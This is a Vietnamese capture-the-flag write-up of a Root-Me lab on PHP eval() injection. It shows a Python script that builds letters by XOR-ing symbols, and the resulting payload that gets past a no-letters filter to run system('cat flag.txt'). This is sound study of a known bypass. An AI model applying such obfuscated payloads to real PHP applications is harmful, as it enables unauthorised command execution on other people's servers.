# Code Injection
Bài này em sẽ dựng lại 1 bài lab trên root-me về hàm `eval()` trong PHP

`eval()` là hàm có thể thực thi được code PHP vì vậy dùng nó không an toàn có thể nguy hiển khi kẻ tấn công có thể inject mã độc vào và app sẽ thực thi nó.

`Description: The flag is in flag.txt file.`
<br><br><br>

Web có nhận vào input và sẽ thực thi mã: 

![image](https://user-images.githubusercontent.com/92881216/233818249-f9b8170f-9830-489e-b6d9-353485eea625.png)

Khi nhập `1+2` và kết quả:

![image](https://user-images.githubusercontent.com/92881216/233818284-017a457f-329b-495b-9095-e1e9a9fe56ee.png)

Hướng khai thắc ở đây là sẽ truyền vào hàm độc hại có thể thực thi câu lệnh hệ thống như: `system()` hoặc `exec()`,... để đọc `flag.txt`

Tuy nhiên web không chấp nhận đầu vào là ký tự alphabet và ` : `(preg_match('/[a-zA-Z`]/', $_GET['input']))`.

Để giải bài này có 2 phương pháp ở <a href="https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/" >đây</a>

Em sẽ làm cách 1 vì nó đơn giản và ngắn gọn hơn.

Đó là sử dụng `XOR` từ các ký tự khác để tạo ra chữ cái.

Ví dụ: 

'(' XOR ']' được `s` từ đó sẽ xây dựng ra payload: `system('cat flag.txt')`

`Script: `
```
LETTERS="!@$%()[]_^-={}.|><,;"
text="system('cat flag.txt')"

for n in text:
    for i in LETTERS:
        for j in LETTERS:
            if ord(i) ^ ord(j) == ord(n):
                print(f"('{i}'^'{j}')={n}")
                break
            if n=='(' or n==')' or n=="'" or n==".":
                print(f"{n}={n}")
                break
        else:
            continue
        break
```
Kết quả:

![image](https://user-images.githubusercontent.com/92881216/233818827-4c47e422-f934-4d6a-a60a-bdd0a1e99cc4.png)

Tuy nhiên khi nhập vào input nó sẽ chỉ in ra dạng text. Vì vậy ta cần tìm cách gọi hàm để nó thực thi luôn. Một cách gọi làm ở đây sẽ là `(function)()`

Ghép các payload trên thành payload hoàn chỉnh:
```
(('('^'[').('$'^']').('('^'[').(')'^']').('@'^'%').('@'^'-'))((']'^'>').('!'^'@').(')'^']').('['^'{').('['^'=').('@'^',').('!'^'@').('['^'<').'.'.(')'^']').('%'^']').(')'^']'))
```
Payload ứng với `system(cat flag.txt)`

Kết quả: 

![image](https://user-images.githubusercontent.com/92881216/233818926-e64e3b6e-b1ac-4344-8ed3-47f08a71706c.png)


